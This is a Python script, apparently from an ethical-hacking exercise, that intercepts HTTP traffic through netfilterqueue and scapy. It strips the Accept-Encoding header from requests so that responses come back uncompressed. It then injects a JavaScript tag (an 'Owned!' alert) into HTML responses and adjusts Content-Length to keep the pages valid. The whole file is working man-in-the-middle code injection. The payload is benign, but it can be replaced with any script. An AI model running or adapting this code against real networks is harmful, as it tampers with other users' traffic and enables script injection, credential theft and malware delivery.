# Built-in imports
import sys; sys.path.append("/home/darkest/Dropbox/code/darkest/python")
import argparse
import re

# Third-party imports
import scapy.all as scapy
import netfilterqueue

# Darkest APi imports
import darkest.Core as dac
from darkest import log




def setLoad(packet, load):
  packet[scapy.Raw].load = load
  del packet[scapy.IP].len
  del packet[scapy.IP].chksum
  del packet[scapy.TCP].chksum
  return packet


def processPacket(packet): 
  packetScapy = scapy.IP(packet.get_payload())
  if packetScapy.haslayer(scapy.Raw) and packetScapy.haslayer(scapy.TCP):  # We need to also check for the TCP layer to not run into index error
    load = packetScapy[scapy.Raw].load
    if packetScapy[scapy.TCP].dport == 80:  # Rquest
      log.info("[+] Request")
      load = re.sub(
        "Accept-Encoding:.*?\\r\\n", "",
        load.decode("utf-8", "replace")
      )
    elif packetScapy[scapy.TCP].sport == 80:  # Response
      log.info("[+] Response")
      codeInjection = "<script>alert('Owned!');</script>"
      load = str(load).replace(
        "</body>",
        f"{codeInjection}</body>"
      )
      lenContentSearch = re.search("(?:Content-Length:\s)(\d*)", load)
      if lenContentSearch and "text/html" in load:
        lenContent = lenContentSearch.group(1)
        lenContentNew = int(lenContent) + len(codeInjection)
        load = load.replace(lenContent, str(lenContentNew))
    if load != packetScapy[scapy.Raw].load:
      packetNew = setLoad(packetScapy, load)
      packet.set_payload(bytes(packetNew))

  packet.accept()



def syntaxCreator():
  """Creates the command's syntax object and returns it.
  """
  parser = argparse.ArgumentParser()
  parser.add_argument("-q", "--queue", default=0, type=int, help="Queue number, default is 0.")
  return parser.parse_args()


if __name__ == "__main__":
  args = syntaxCreator()
  # Could be done in the constructor directly but lets keep it as class variables 
  queueIndx = dac.Net.createIpTables("local")
  try:
    dac.Net.bindIpTables(queueIndx, processPacket)
  except KeyboardInterrupt:
    log.info("\n[+] Flushing ip tables, please wait.\n")
    dac.Net.flushIpTables()

